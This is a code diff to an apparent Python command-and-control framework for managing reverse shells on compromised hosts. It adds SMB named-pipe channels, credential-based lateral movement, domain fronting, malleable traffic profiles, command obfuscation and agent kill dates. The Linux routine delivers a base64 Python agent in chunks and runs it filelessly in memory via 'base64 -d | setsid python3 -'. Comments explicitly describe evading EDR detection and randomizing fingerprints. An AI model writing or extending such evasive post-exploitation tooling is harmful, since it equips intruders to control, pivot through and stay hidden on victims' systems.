+        delays = (1.0, 1.5, 2.0, 3.0, 4.0, 5.0, 5.0, 5.0)
+        bridge = None
+        last_exc = None
+
+        for attempt, delay in enumerate(delays, 1):
+            time.sleep(delay)
+            try:
+                bridge = SmbPipeSessionSocket(
+                    target_host, pipe_name, username, password, domain,
+                )
+                bridge.connect(timeout=10.0)
+                break
+            except Exception as exc:
+                last_exc = exc
+                # CRITICAL: the bridge object is created before connect()
+                # runs, so on failure it survives the loop with a valid
+                # socketpair fd. If we don't drop it here, the post-loop
+                # `if bridge is None` check treats a dead object as a
+                # live transport and registers it. Tear it down now.
+                if bridge is not None:
+                    try:
+                        bridge.close()
+                    except Exception:
+                        pass
+                    bridge = None
+
+                msg = str(exc).lower()
+                # "Pipe not yet created" is the only error that benefits
+                # from retrying — the target's Add-Type may still be
+                # compiling. Everything else is deterministic.
+                if 'object_name_not_found' in msg or 'not found' in msg:
+                    continue
+                if attempt == 1:
+                    print(f"{self.colors['yellow']}[SMB] connect failed: "
+                          f"{type(exc).__name__}: {exc}{self.colors['end']}")
+                break
+
+        if bridge is None:
+            # If we got here without explicit credentials, the SSO
+            # attempt has failed. The most common cause is that the
+            # handler's logon context is not recognised by the target's
+            # SMB server (Linux handler without a TGT, Windows handler
+            # not on the same domain, etc.). Fall back to the same-host
+            # loopback channel rather than giving up.
+            if use_sso:
+                print(f"{self.colors['yellow']}[SMB] SSO attempt failed "
+                      f"({last_exc}) — falling back to the same-host "
+                      f"secondary channel{self.colors['end']}")
+                return self._smb_switch_loopback(client_id, pipe_name)
+
+            print(f"{self.colors['red']}[SMB] could not attach after "
+                  f"{len(delays)} attempts — last error: {last_exc}"
+                  f"{self.colors['end']}")
+            return False
+
+        # Register the bridge the same way HTTP/2 does.
+        info['transports']['smb'] = bridge
+        info['active_transport']  = 'smb'
+        with self.client_lock:
+            self.revshell_clients[bridge] = info
+
+        display = info['name'] if info.get('name') else f"#{info['id']}"
+        print(f"{self.colors['green']}[SMB] Transport attached to {display} — "
+              f"active transport is now smb{self.colors['end']}")
+
+        # Reinstall the command obfuscator on the pipe server's shell.
+        # The C# SmbShell spawns its own cmd.exe or PowerShell; that
+        # shell has never seen the installer.
+        obf = info.get('obfuscator')
+        if obf is not None and (info.get('win_shell') or '').lower() == 'powershell':
+            installer = _powershell_obfuscator_installer(obf.hex)
+            try:
+                bridge.sendall((installer + '\n').encode())
+                time.sleep(0.3)
+                self.recv_output(bridge, timeout=0.5)
+            except Exception:
+                pass
+
+        return True
+
+    def _smb_switch_loopback(self, client_id, pipe_name=None):
+        """
+        Same-host secondary channel over the shell the operator already
+        owns. No SMB, no credentials, no 445.
+
+        `pipe_name` is accepted for CLI symmetry with the credential
+        path, but there is no pipe in loopback mode — the byte path is
+        the existing HTTPS secondary transport. If a name was supplied,
+        say so once and move on rather than silently dropping it.
+        """
+
+        info = self._get_info_by_id(client_id)
+        if info is None:
+            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
+            return False
+
+        if info['transports'].get('smb') is not None:
+            print(f"{self.colors['yellow']}[SMB] transport already active on "
+                  f"#{client_id}{self.colors['end']}")
+            return False
+
+        # Reuse the HTTP/2 path if the operator has already enabled it.
+        # Running two concurrent secondary transports over the same shell
+        # would require a real multiplexer, and one is never necessary in
+        # practice — a session has a single "active" transport at a time.
+        if info['transports'].get('http2') is not None:
+            print(f"{self.colors['yellow']}[SMB] HTTP/2 transport already "
+                  f"active on #{client_id} — no second same-host channel "
+                  f"is needed{self.colors['end']}")
+            return False
+
+        # Without credentials there is no way to authenticate to the
+        # target's SMB server over the network. The best secondary
+        # channel available in that case is the existing HTTPS path,
+        # which is what http2_switch deploys. The transport will show
+        # up as 'http2' in `transport <ID>` — that is accurate.
+        print(f"{self.colors['cyan']}[SMB] Using the same-host secondary "
+              f"channel (no network SMB involved){self.colors['end']}")
+        if pipe_name:
+            print(f"{self.colors['yellow']}[SMB] --pipe {pipe_name!r} was "
+                  f"supplied but is ignored in loopback mode — there is no "
+                  f"pipe, the channel is the existing HTTPS transport"
+                  f"{self.colors['end']}")
+        # Non-interactive: this is an automatic fallback, not an
+        # operator-initiated switch. Use the handler default profile.
+        return self.http2_switch(client_id, interactive=False)
+
+    def _http2_payload_linux(self, host, port, path, kill_deadline,
+                             profile=None):
         """Return a base64-encoded Python agent for Linux targets."""
         import base64 as _b64
+        prof = profile or self.profile
+        ua = prof['http2'].get('linux_user_agent') or ''
         src = (
             _HTTP2_AGENT_LINUX_PY
             .replace('__H2_HOST__', host)
             .replace('__H2_PORT__', str(port))
-            .replace('__H2_PATH__', f'/c2/{token}')
+            .replace('__H2_PATH__', path)
+            .replace('__H2_KILL__', str(int(kill_deadline)))
+            .replace('__H2_UA__', ua)
         )
         return _b64.b64encode(src.encode('utf-8')).decode('ascii')
 
@@ -1556,7 +2382,8 @@ class TORNADOREVC2:
         except Exception:
             return None
 
-    def _deliver_http2_linux(self, primary_sock, host, port, token):
+    def _deliver_http2_linux(self, primary_sock, host, port, path,
+                             profile=None):
         """
         Deliver the Linux HTTP/2 agent entirely in memory.
 
@@ -1564,6 +2391,9 @@ class TORNADOREVC2:
         variable across multiple PTY-safe chunks, then decoded and piped
         straight into `python3 -` via stdin. No file ever touches disk —
         not even for a fraction of a second.
+
+        `path` is the full HTTP path plus query string (e.g.
+        '/c2/<token>?s=<hmac>'), so the agent can present the HMAC proof.
 
         Process isolation:
           - `setsid` puts the agent in its own session, so it is immune to
@@ -1575,28 +2405,33 @@ class TORNADOREVC2:
           - the shell variable holding the base64 is unset immediately
             after launch, so it does not linger in the shell's memory.
 
+        Every operator-visible string (the shell variable name, the
+        launch marker) is randomly generated per call, so no two
+        deliveries share a fingerprint. The kill date is embedded in
+        the payload, not passed on the command line.
+
         Returns True if the launch command was sent, False on write failure.
         """
-        b64 = self._http2_payload_linux(host, port, token)
+        # Kill date: 30 days from now by default. The agent self-destructs
+        # past this point. Set TORNADO_KILL_DAYS to override.
+        try:
+            kill_days = int(os.environ.get('TORNADO_KILL_DAYS', '30'))
+        except Exception:
+            kill_days = 30
+        kill_deadline = int(time.time()) + kill_days * 86400
 
-        # Shell variable we will grow one chunk at a time. The variable
-        # name is intentionally short and unlikely to collide with
-        # anything the operator has already defined.
-        var = "_h2b64"
+        b64 = self._http2_payload_linux(host, port, path, kill_deadline,
+                                        profile=profile)
 
-        # Step 1 — initialise (and if a previous attempt left it set,
-        # clear it) the variable. Single quotes for the empty string.
+        # Randomised per-delivery identifiers. `_h2b64` and `H2_LAUNCHED`
+        # are replaced with values that differ on every call.
+        var    = "_h" + secrets.token_hex(5)
+        marker = "M" + secrets.token_hex(6)
+
         if not self.send_to_revshell(primary_sock, f"{var}=''"):
             return False
         self.recv_output(primary_sock, timeout=0.5)
 
-        # Step 2 — append base64 chunks. 500 chars keeps every command
-        # well under the PTY canonical input buffer (typically 4095),
-        # even after the wrapper syntax is added.
-        #
-        #     VAR="$VAR"'newpiece'
-        #
-        # concatenates without a space, preserving the base64 stream.
         CHUNK = 500
         for i in range(0, len(b64), CHUNK):
             piece = b64[i:i + CHUNK]
@@ -1606,25 +2441,22 @@ class TORNADOREVC2:
                 return False
             self.recv_output(primary_sock, timeout=0.4)
 
-        # Step 3 — decode and execute in one shot, in memory.
-        #
-        #   printf '%s' "$VAR"      → emit the base64
-        #   | base64 -d             → decode to Python source
-        #   | setsid python3 -      → read source from stdin and run it
-        #   >/dev/null 2>&1         → swallow all output
-        #   &                       → background the whole pipeline
-        #   unset VAR               → scrub the base64 from shell memory
-        #   echo H2_LAUNCHED        → marker the operator can grep for
-        #
-        # Double quotes around "$VAR" are safe: base64 alphabet is
-        # [A-Za-z0-9+/=], none of which the shell interprets.
         launch = (
             f"printf '%s' \"${var}\" | base64 -d | "
             f"setsid python3 - >/dev/null 2>&1 & "
             f"unset {var}; "
-            f"echo H2_LAUNCHED"
+            f"echo {marker}"
         )
-        return self.send_to_revshell(primary_sock, launch)
+        sent = self.send_to_revshell(primary_sock, launch)
+        if sent:
+            # Return the marker so the caller can wait for it explicitly.
+            try:
+                info = self._client_info(primary_sock)
+                if info is not None:
+                    info['_h2_launch_marker'] = marker
+            except Exception:
+                pass
+        return sent
 
     def _h2_preflight(self, info):
         """
@@ -1668,11 +2500,26 @@ class TORNADOREVC2:
             return 'h2', f'PowerShell {major}'
         return 'h1', f'PowerShell {major} (HTTP/2 requires PS 7+)'
 
-    def _http1_payload(self, url):
-        return _HTTP1_AGENT_PS.replace('__H1_URL__', url)
+    def _http1_payload(self, url, profile=None):
+        prof = profile or self.profile
+        ua = prof['http1'].get('user_agent') or ''
+        ua_ps = ua.replace("'", "''")   # single-quote escape for PS literal
+        return (
+            _HTTP1_AGENT_PS
+            .replace('__H1_URL__', url)
+            .replace('__H1_UA__', ua_ps)
+        )
 
-    def http2_switch(self, client_id, handler_host=None):
-        """Spawn an HTTP-based secondary transport and flip the active one."""
+    def http2_switch(self, client_id, handler_host=None, profile_name=None,
+                     interactive=True):
+        """
+        Spawn an HTTP-based secondary transport and flip the active one.
+
+        Profile selection, in priority order:
+          1. `profile_name` — explicit name from the `profiles/` directory
+          2. `interactive=True` — prompt with the list of available profiles
+          3. handler default (`--profile` at CLI, or built-in defaults)
+        """
         info = self._get_info_by_id(client_id)
         if info is None:
             print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
@@ -1741,6 +2588,31 @@ class TORNADOREVC2:
             f"{self.colors['end']}"
         )
 
+        # ---- Per-session profile selection --------------------------------
+        session_profile = None
+        if profile_name:
+            session_profile = self._load_profile_by_name(profile_name)
+            if session_profile is None:
+                return False
+            print(f"{self.colors['cyan']}[H2] Using profile: "
+                  f"{profile_name}{self.colors['end']}")
+        elif interactive:
+            chosen = self._prompt_profile_selection()
+            if chosen is False:
+                print(f"{self.colors['yellow']}[H2] Cancelled"
+                      f"{self.colors['end']}")
+                return False
+            if chosen:
+                session_profile = self._load_profile_by_name(chosen)
+                if session_profile is None:
+                    return False
+                print(f"{self.colors['cyan']}[H2] Using profile: "
+                      f"{chosen}{self.colors['end']}")
+        if session_profile is None:
+            session_profile = self.profile
+        info['profile'] = session_profile
+        info['profile_name'] = profile_name or '(handler default)'
+
         token = secrets.token_hex(8)
         with self.client_lock:
             self._h2_pending[token] = info['sock']
@@ -1748,9 +2620,20 @@ class TORNADOREVC2:
         primary_sock = info['sock']
         shell_kind   = (info.get('type') or 'unknown').lower()
 
+        # Domain fronting / redirector configuration. When set, the
+        # agent's SNI and Host header point at the fronting domain; the
+        # redirector routes /c2/<token> back to our real listener.
+        front_domain = self._front_domain          # set via --front-domain
+        front_port   = self._front_port            # optional override
+
+        url = self._build_h2_url(
+            handler_host, self.h2_port, token,
+            front_domain=front_domain, front_port=front_port,
+            profile=session_profile,
+        )
+
         if shell_kind == 'windows' and mode == 'h2':
-            url = f"https://{handler_host}:{self.h2_port}/c2/{token}"
-            ps  = self._http2_payload(url)
+            ps = self._http2_payload(url, profile=session_profile)
             print(
                 f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
                 f"(Windows PS 7+, callback {url}){self.colors['end']}"
@@ -1758,8 +2641,7 @@ class TORNADOREVC2:
             sent = self._send_win_ps(primary_sock, ps)
 
         elif shell_kind == 'windows' and mode == 'h1':
-            url = f"https://{handler_host}:{self.h2_port}/c2/{token}"
-            ps  = self._http1_payload(url)
+            ps = self._http1_payload(url, profile=session_profile)
             print(
                 f"{self.colors['cyan']}[H2] Spawning HTTP/1.1 agent on #{client_id} "
                 f"(Windows PS 5, callback {url}){self.colors['end']}"
@@ -1769,11 +2651,22 @@ class TORNADOREVC2:
         else:
             print(
                 f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
-                f"(Unix, callback https://{handler_host}:{self.h2_port}/c2/{token})"
+                f"(Unix, callback {url})"
                 f"{self.colors['end']}"
             )
+            # The Linux path needs the raw host/port used for the socket
+            # connection (which is always the real listener, not the
+            # fronting domain), plus the path portion of the URL.
+            real_host = handler_host
+            real_port = self.h2_port
+            from urllib.parse import urlsplit as _us
+            _parts = _us(url)
+            path = _parts.path
+            if _parts.query:
+                path += '?' + _parts.query
             sent = self._deliver_http2_linux(
-                primary_sock, handler_host, self.h2_port, token,
+                primary_sock, real_host, real_port, path,
+                profile=session_profile,
             )
 
         if not sent:
@@ -1808,10 +2701,11 @@ class TORNADOREVC2:
             print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
             return False
 
-        h2 = info['transports'].get('http2')
+        # Prefer SMB, then HTTP/2 — whichever is currently attached.
+        h2 = info['transports'].get('smb') or info['transports'].get('http2')
         if h2 is None:
             print(
-                f"{self.colors['yellow']}No HTTP/2 transport active on "
+                f"{self.colors['yellow']}No secondary transport active on "
                 f"#{client_id}{self.colors['end']}"
             )
             return False
@@ -1832,12 +2726,13 @@ class TORNADOREVC2:
             pass
         with self.client_lock:
             self.revshell_clients.pop(h2, None)
+        info['transports']['smb']   = None
         info['transports']['http2'] = None
         info['active_transport']    = 'shell'
 
         display = info['name'] if info.get('name') else f"#{client_id}"
         print(
-            f"{self.colors['green']}[H2] HTTP/2 transport closed on "
+            f"{self.colors['green']}Secondary transport closed on "
             f"{display} — reverted to shell{self.colors['end']}"
         )
         logger = info.get('logger')
@@ -1863,31 +2758,27 @@ class TORNADOREVC2:
         return None
 
     def _active_sock_for_info(self, info):
-        """
-        Return the current live transport for a session info dict.
-
-        Preference order:
-        1. The transport marked active_transport, if its fileno is valid.
-        2. The other transport, if it's still alive.
-        3. The primary shell socket as a last resort.
-        """
+        """Return the current live transport socket for a session, or
+        None if nothing is alive. Delegates to Session.active_sock() so
+        the preference order lives in one place."""
         if info is None:
             return None
+        if isinstance(info, Session):
+            return info.active_sock()
+        # Legacy dict path
         with self.client_lock:
             active     = info.get('active_transport', 'shell')
             transports = dict(info.get('transports') or {})
-
         candidates = []
         primary = transports.get(active)
         if primary is not None:
             candidates.append(primary)
-        for key in ('shell', 'http2'):
+        for key in ('shell', 'http2', 'smb'):
             t = transports.get(key)
             if t is not None and t not in candidates:
                 candidates.append(t)
         if info.get('sock') and info['sock'] not in candidates:
             candidates.append(info['sock'])
-
         for t in candidates:
             try:
                 if t.fileno() != -1:
@@ -1907,6 +2798,7 @@ class TORNADOREVC2:
         active = info.get('active_transport', 'shell')
         shell  = (info.get('transports') or {}).get('shell')
         h2     = (info.get('transports') or {}).get('http2')
+        smb    = (info.get('transports') or {}).get('smb')
 
         def _state(sock):
             if sock is None:
@@ -1921,6 +2813,7 @@ class TORNADOREVC2:
         print(f"  active       : {c['bold']}{active}{c['end']}")
         print(f"  shell        : {_state(shell)}")
         print(f"  http2        : {_state(h2)}")
+        print(f"  smb          : {_state(smb)}")
         print(f"  last active  : {info.get('last_send_via', '(none yet)')}")
         print(f"  last addr    : {info.get('last_send_addr', '(none)')}")
 
@@ -2206,7 +3099,10 @@ class TORNADOREVC2:
             for sock, info in self.revshell_clients.items():
                 if sock.fileno() == -1:
                     continue
-                sid = info.get('id')
+                if not info.get('id'):
+                    # Unidentified (id is None or 0). Skip.
+                    continue
+                sid = info['id']
                 if sid in seen:
                     continue
                 seen.add(sid)
@@ -2220,7 +3116,12 @@ class TORNADOREVC2:
                 else:
                     proto = "TCP"
 
-                direction = "BIND" if info.get('direction') == 'bind' else "REV"
+                if info.get('direction') == 'bind':
+                    direction = "BIND"
+                elif info.get('direction') == 'lateral':
+                    direction = f"LATERAL(via #{info.get('lateral_via', '?')})"
+                else:
+                    direction = "REV"
                 proto = f"{proto}/{direction}"
                 act = info.get('active_transport', 'shell')
                 if act == 'http2':
@@ -2561,6 +3462,34 @@ class TORNADOREVC2:
                             print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
                         continue
 
+                    if cmd_lower == 'smbswitch':
+                        pipe_name = None
+                        username  = ''
+                        password  = ''
+                        domain    = ''
+                        if '--pipe' in cmd_parts:
+                            idx = cmd_parts.index('--pipe')
+                            if idx + 1 < len(cmd_parts):
+                                pipe_name = cmd_parts[idx + 1]
+                        if '--user' in cmd_parts:
+                            idx = cmd_parts.index('--user')
+                            if idx + 1 < len(cmd_parts):
+                                username = cmd_parts[idx + 1]
+                        if '--pass' in cmd_parts:
+                            idx = cmd_parts.index('--pass')
+                            if idx + 1 < len(cmd_parts):
+                                password = cmd_parts[idx + 1]
+                        if '--domain' in cmd_parts:
+                            idx = cmd_parts.index('--domain')
+                            if idx + 1 < len(cmd_parts):
+                                domain = cmd_parts[idx + 1]
+                        self.smb_switch(info['id'], pipe_name, username, password, domain)
+                        continue
+
+                    if cmd_lower == 'profiles':
+                        self.list_profiles()
+                        continue
+
                     if cmd_lower == 'http2switch':
                         if info is None:
                             print(f"{self.colors['red']}Session gone{self.colors['end']}")
@@ -2570,7 +3499,13 @@ class TORNADOREVC2:
                             idx = cmd_parts.index('--rh')
                             if idx + 1 < len(cmd_parts):
                                 rh = cmd_parts[idx + 1]
-                        self.http2_switch(info['id'], handler_host=rh)
+                        prof_name = None
+                        if '--profile' in cmd_parts:
+                            idx = cmd_parts.index('--profile')
+                            if idx + 1 < len(cmd_parts):
+                                prof_name = cmd_parts[idx + 1]
+                        self.http2_switch(info['id'], handler_host=rh,
+                                          profile_name=prof_name)
                         continue
 
                     if cmd_lower == 'backtoshell':
@@ -2614,9 +3549,17 @@ class TORNADOREVC2:
     bof <name> [args...]          Run a registered BOF from inside a session
 
     {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
-    http2switch [--rh <ip|iface>]                     Switch this session to the HTTP/2 channel
-    backtoshell                                       Close HTTP/2 and go back to the shell
+    http2switch [--rh <ip|iface>] [--profile <name>]  Switch this session to the HTTP/2 channel
+    smbswitch [--pipe <name>] [--user <u>] [--pass <p>] [--domain <d>]
+                                                      Switch session to SMB named-pipe channel (Windows)
+    backtoshell                                       Close the active secondary transport
     transport                                         Show which channel is active
+    profiles                                          List available malleable profiles
+
+    {self.colors['green']}NOTE:{self.colors['end']}
+    On Linux HTTP/2 sessions, `cat`, `ls`, `env`, `ps`, `pwd`, `whoami`,
+    `id`, `hostname`, and `uname` execute in-process — no child spawn.
+    All other commands fall through to the shell as normal.
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <local> <remote>                Chunked upload with SHA256 verify
@@ -2771,10 +3714,69 @@ class TORNADOREVC2:
                               f"'bof' unavailable{self.colors['end']}")
                     except Exception as e:
                         print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
+                elif cmd_lower == 'smblateral':
+                    if len(cmd_parts) < 3:
+                        print(f"{self.colors['red']}Usage: smblateral "
+                              f"<A_ID> <B_host> <B_pipe> "
+                              f"[--user <u>] [--pass <p>] [--domain <d>]"
+                              f"{self.colors['end']}")
+                        continue
+                    try:
+                        a_id = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid A ID{self.colors['end']}")
+                        continue
+                    b_host = cmd_parts[2]
+                    b_pipe = cmd_parts[3] if len(cmd_parts) > 3 else ''
+                    user = passwd = dom = ''
+                    for flag, dest in (('--user', 'u'), ('--pass', 'p'), ('--domain', 'd')):
+                        if flag in cmd_parts:
+                            idx = cmd_parts.index(flag)
+                            if idx + 1 < len(cmd_parts):
+                                if dest == 'u': user = cmd_parts[idx + 1]
+                                elif dest == 'p': passwd = cmd_parts[idx + 1]
+                                else: dom = cmd_parts[idx + 1]
+                    self.smb_lateral(a_id, b_host, b_pipe, user, passwd, dom)
+                elif cmd_lower == 'smbswitch':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: smbswitch <ID> "
+                              f"[--pipe <name>] [--user <user>] "
+                              f"[--pass <pass>] [--domain <dom>]"
+                              f"{self.colors['end']}")
+                        continue
+                    try:
+                        sid = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                        continue
+                    pipe_name = None
+                    username  = ''
+                    password  = ''
+                    domain    = ''
+                    if '--pipe' in cmd_parts:
+                        idx = cmd_parts.index('--pipe')
+                        if idx + 1 < len(cmd_parts):
+                            pipe_name = cmd_parts[idx + 1]
+                    if '--user' in cmd_parts:
+                        idx = cmd_parts.index('--user')
+                        if idx + 1 < len(cmd_parts):
+                            username = cmd_parts[idx + 1]
+                    if '--pass' in cmd_parts:
+                        idx = cmd_parts.index('--pass')
+                        if idx + 1 < len(cmd_parts):
+                            password = cmd_parts[idx + 1]
+                    if '--domain' in cmd_parts:
+                        idx = cmd_parts.index('--domain')
+                        if idx + 1 < len(cmd_parts):
+                            domain = cmd_parts[idx + 1]
+                    self.smb_switch(sid, pipe_name, username, password, domain)
+                elif cmd_lower == 'profiles':
+                    self.list_profiles()
                 elif cmd_lower == 'http2switch':
                     if len(cmd_parts) < 2:
                         print(f"{self.colors['red']}Usage: http2switch <ID> "
-                              f"[--rh <handler-ip|iface>]{self.colors['end']}")
+                              f"[--rh <handler-ip|iface>] [--profile <name>]"
+                              f"{self.colors['end']}")
                         continue
                     try:
                         sid = int(cmd_parts[1])
@@ -2786,7 +3788,13 @@ class TORNADOREVC2:
                         idx = cmd_parts.index('--rh')
                         if idx + 1 < len(cmd_parts):
                             rh = cmd_parts[idx + 1]
-                    self.http2_switch(sid, handler_host=rh)
+                    prof_name = None
+                    if '--profile' in cmd_parts:
+                        idx = cmd_parts.index('--profile')
+                        if idx + 1 < len(cmd_parts):
+                            prof_name = cmd_parts[idx + 1]
+                    self.http2_switch(sid, handler_host=rh,
+                                      profile_name=prof_name)
                 elif cmd_lower == 'backtoshell':
                     if len(cmd_parts) < 2:
                         print(f"{self.colors['red']}Usage: backtoshell <ID>{self.colors['end']}")
@@ -2897,9 +3905,21 @@ class TORNADOREVC2:
     bof <ID> <name> [args...]     Run a registered BOF from a session
 
     {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
-    http2switch <ID> [--rh <ip|iface>]                       Switch session to the HTTP/2 channel
-    backtoshell <ID>                                         Close HTTP/2 and go back to the shell
+    http2switch <ID> [--rh <ip|iface>] [--profile <name>]    Switch session to the HTTP/2 channel
+                                                              (interactive profile picker when --profile omitted)
+    smbswitch <ID> [--pipe <name>] [--user <u>] [--pass <p>] [--domain <d>]
+                                                              Switch session to SMB named-pipe channel
+    smblateral <A_ID> <B_host> <B_pipe> [--user <u>] [--pass <p>] [--domain <d>]
+                                                              Open a lateral channel from session A to host B
+    backtoshell <ID>                                         Close secondary transport and go back to shell
     transport <ID>                                           Show which channel is active
+    profiles                                                 List available malleable profiles
+
+    {self.colors['green']}OPSEC (always on):{self.colors['end']}
+    Command obfuscation         Per-session XOR+base64 (bash / PowerShell)
+    In-process execution        cat/ls/env/ps served by HTTP/2 agent on Linux
+    ECDSA signing               Signed commands on Windows HTTP/2 sessions
+    Kill date                   Agents self-destruct after TORNADO_KILL_DAYS
 
     {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
     socks <ID> <listen_port>                                 Start SOCKS5 proxy via session
@@ -2931,33 +3951,53 @@ class TORNADOREVC2:
 
         primary = info.get('sock')
 
+        # If an SMB transport was attached, tell the target to kill its
+        # pipe server. The pipe name is stored on the info dict.
+        smb = (info.get('transports') or {}).get('smb')
+        if smb is not None:
+            try:
+                if primary is not None and not info.get('_smb_killed'):
+                    info['_smb_killed'] = True
+                    # Kill any PowerShell child running our SmbShell class.
+                    self.send_to_revshell(
+                        primary,
+                        "Get-Job | Where-Object { $_.State -eq 'Running' } | "
+                        "Stop-Job -EA 0; Get-Job | Remove-Job -Force -EA 0",
+                    )
+            except Exception:
+                pass
+
         # Case 1: this is a *secondary* transport being torn down.
-        # Remove it from transports and revert to the primary if it was active.
+        # Remove it from transports and revert to a live transport.
         if client_sock is not primary:
-            for k, v in list((info.get('transports') or {}).items()):
+            tr = info.get('transports') or {}
+            which = None
+            for k, v in list(tr.items()):
                 if v is client_sock:
-                    info['transports'][k] = None
+                    which = k
+                    break
             try:
                 client_sock.close()
             except Exception:
                 pass
-            if info.get('active_transport') != 'shell' and \
-               info['transports'].get(info['active_transport']) is None:
-                info['active_transport'] = 'shell'
-                reason = info.pop('_last_h2_close_reason', None)
-                if reason is None:
-                    import traceback as _tb
-                    reason = 'unknown'
-                    print(
-                        f"{self.colors['red']}[transport] closing bridge "
-                        f"with no reason set. Stack:{self.colors['end']}"
-                    )
-                    for line in _tb.format_stack():
-                        print(f"  {line.rstrip()}")
+
+            if which is None:
+                return
+
+            if isinstance(info, Session):
+                new_active = info.detach_transport(which)
+            else:
+                info['transports'][which] = None
+                if info.get('active_transport') == which:
+                    info['active_transport'] = 'shell'
+                new_active = info.get('active_transport')
+
+            if new_active != which:
+                reason = info.pop('_last_h2_close_reason', None) or 'unknown'
                 print(
-                    f"{self.colors['yellow']}Secondary transport on "
-                    f"#{info['id']} closed — reverted to shell "
-                    f"(reason: {reason})"
+                    f"{self.colors['yellow']}Secondary transport "
+                    f"({which}) on #{info['id']} closed — active transport "
+                    f"is now {new_active} (reason: {reason})"
                     f"{self.colors['end']}"
                 )
             return
@@ -2970,6 +4010,19 @@ class TORNADOREVC2:
                 h2_alive = h2.fileno() != -1
             except Exception:
                 h2_alive = False
+
+        # If this was a lateral session, stop A's forwarder job.
+        a_sock = info.get('_lateral_a_sock')
+        if a_sock is not None and not info.get('_lateral_stopped'):
+            info['_lateral_stopped'] = True
+            try:
+                self.send_to_revshell(
+                    a_sock,
+                    "Get-Job | Where-Object { $_.State -eq 'Running' } | "
+                    "Stop-Job -EA 0; Get-Job | Remove-Job -Force -EA 0",
+                )
+            except Exception:
+                pass
 
         self.tunnels.cleanup_session(client_sock)
         try:
@@ -3037,27 +4090,26 @@ class TORNADOREVC2:
         sys.stderr.flush()
 
     def handle_client(self, client_sock, addr, direction='reverse'):
-        client_info = {
-            'sock': client_sock,
-            'addr': addr,
-            'direction': direction,
-            'type': 'unknown',
-            'id': None,
-            'name': None,
-            'tls': isinstance(client_sock, ssl.SSLSocket),
-            'mtls': _detect_mtls(client_sock),
-            'pty': False,
-            'init': False,
-            'sysinfo': None,
-            'logger': None,
-            'fingerprint': None,
-            'connect_count': 1,
-            'reconnected': False,
-            # Secondary-transport bookkeeping.
-            'transports': {'shell': client_sock, 'http2': None},
-            'active_transport': 'shell',
-            'h2_token': None,
-        }
+
+        # Connect-time jitter. Default is short (0.3-1.5 s) so that
+        # multiple simultaneous shells finish probing at roughly the
+        # same time. For engagements that need a larger stagger, set
+        # TORNADO_CONNECT_DELAY="<low>:<high>" (seconds) — e.g. "5:30".
+        try:
+            env = os.environ.get('TORNADO_CONNECT_DELAY')
+            if env:
+                low, high = (float(x) for x in env.split(':', 1))
+            else:
+                low, high = 0.3, 1.5
+            time.sleep(random.uniform(low, high))
+        except Exception:
+            time.sleep(random.uniform(0.3, 1.5))
+
+        client_info = Session(client_sock, addr, direction=direction)
+        # mtls is detected at construction time; Session's __init__
+        # cannot see the socket's peer cert reliably until it's been
+        # wrapped, so set it explicitly.
+        client_info['mtls'] = _detect_mtls(client_sock)
         with self.client_lock:
             self.revshell_clients[client_sock] = client_info
 
@@ -3068,25 +4120,30 @@ class TORNADOREVC2:
         start_mark, end_mark = make_probe_markers()
         client_info['probe_markers'] = (start_mark, end_mark)
 
-        # Single, less-signatured Unix probe. Prefer /etc/os-release over
-        # `uname -a` — the latter is the classic red-team fingerprint.
-        # No redirects — cmd.exe chokes on `2>/dev/null` because /dev/
-        # doesn't exist on Windows.
-        unix_probe = (
-            f"cat /etc/os-release | head -3; "
+        # Single consolidated Unix/Windows probe. Both platform branches
+        # are combined into one shell line to keep the connect-time
+        # process count to a minimum. The probe uses the per-session
+        # marker set above; nothing about it is reused across sessions.
+        #
+        # `2>/dev/null || true` is safe here because the goal is to
+        # swallow errors on both platforms — cmd.exe treats the redirect
+        # as a syntax error and prints nothing, which is fine.
+        probe = (
+            f"cat /etc/os-release 2>/dev/null | head -3; "
+            f"uname -srm 2>/dev/null; "
             f"echo {start_mark}; "
-            f"uname -srm || uname -a; "
+            f"ver; "
             f"echo {end_mark}"
         )
-        self.send_to_revshell(client_sock, unix_probe)
+        self.send_to_revshell(client_sock, probe)
         probe_output = self.recv_output(
-            client_sock, timeout=4.0, until_marker=end_mark,
+            client_sock, timeout=6.0, until_marker=end_mark,
         )
 
-        # If the Unix probe returned nothing usable (cmd.exe), send a
-        # single Windows `ver` command. One fallback, not three at once.
+        # Only fall back to the Windows-specific probe if the consolidated
+        # one returned nothing usable. This should be rare.
         if start_mark not in probe_output:
-            time.sleep(random.uniform(0.3, 0.9))
+            time.sleep(random.uniform(0.6, 1.8))
             win_probe = f"echo {start_mark} & ver & echo {end_mark}"
             self.send_to_revshell(client_sock, win_probe)
             probe_output += self.recv_output(
@@ -3097,10 +4154,8 @@ class TORNADOREVC2:
             inferred = 'windows'
         client_info['type'] = inferred
 
-        # Break up the connect-time command burst. Without this, an EDR
-        # sees 4-6 process spawns within a few seconds of the inbound
-        # connection — exactly the pattern automated tooling produces.
-        time.sleep(random.uniform(0.4, 1.4))
+        # Second jitter gap before the PTY upgrade / Windows init block.
+        time.sleep(random.uniform(0.2, 0.8))
         if inferred == 'windows':
             from .win_client import detect_windows_shell_kind
             client_info['win_shell'] = detect_windows_shell_kind(self, client_sock)
@@ -3147,7 +4202,38 @@ class TORNADOREVC2:
             )
             client_info['init'] = True
 
-        self.recv_output(client_sock, timeout=2.0)
+        # ------------------------------------------------------------------
+        # Install command obfuscation.
+        #
+        # bash / zsh and PowerShell sessions get an in-session decoder.
+        # cmd.exe sessions skip — no in-process decoder, and adding an
+        # extra PowerShell process per command would be a net loss.
+        # ------------------------------------------------------------------
+        win_shell = (client_info.get('win_shell') or '').lower()
